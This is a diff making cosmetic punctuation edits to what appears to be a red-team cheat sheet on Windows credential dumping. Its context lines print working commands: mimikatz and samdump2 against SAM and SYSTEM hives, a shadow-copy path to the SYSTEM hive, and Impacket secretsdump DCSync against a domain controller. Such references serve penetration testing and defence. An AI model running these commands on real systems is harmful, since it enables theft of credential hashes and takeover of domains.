@@ -49,7 +49,7 @@ mimikatz # lsadump::sam /system:C:\temp\SYSTEM /sam:C:\temp\SAM
 samdump2 SYSTEM SAM
 ```
 
-## Domain Controller — NTDS.dit (T1003.003)
+## Domain Controller - NTDS.dit (T1003.003)
 
 ### Method 1: ntdsutil (On DC, Admin)
 
@@ -69,7 +69,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 ### Method 3: DCSync (Remote, No File Access Needed)
 
 ```bash
-# Impacket secretsdump — DCSync all accounts
+# Impacket secretsdump - DCSync all accounts
 secretsdump.py corp.local/admin:'Password1'@dc01.corp.local
 
 # Specific user
